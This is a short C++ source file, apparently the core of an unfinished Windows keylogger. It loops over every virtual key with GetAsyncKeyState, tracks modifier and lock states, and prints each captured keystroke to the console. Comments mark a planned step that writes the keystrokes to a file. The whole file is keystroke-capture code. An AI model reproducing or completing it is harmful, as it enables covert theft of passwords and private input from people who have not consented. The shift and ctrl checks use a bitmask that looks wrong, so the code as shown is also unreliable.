#include "keys.hpp"

#include <iostream>
#include <windows.h>


int main(int argc, char* argv[]) { 
    
    bool capslock = GetKeyState(VK_CAPITAL) & 0x0001;
    bool numlock = GetKeyState(VK_NUMLOCK) & 0x0001;
    bool shift = false;
    bool ctrl = false;

    while( true ) {
         
        for( int key = 1; key <= 255; ++key ) {              
            if( GetAsyncKeyState(key) == -32767 ) {
                
                capslock = GetKeyState(VK_CAPITAL) & 0x0001;
                numlock = GetKeyState(VK_NUMLOCK) & 0x0001;
                 
                shift = GetKeyState(VK_SHIFT) & 0x1000;
                ctrl = GetKeyState(VK_CONTROL) & 0x1000;

                std::string key_name = get_key_name(key, shift, ctrl, capslock, numlock);
                std::cout << key_name << std::endl; 
                // input to file
                // continue...
            }
        } 
    }
    return 0;
}


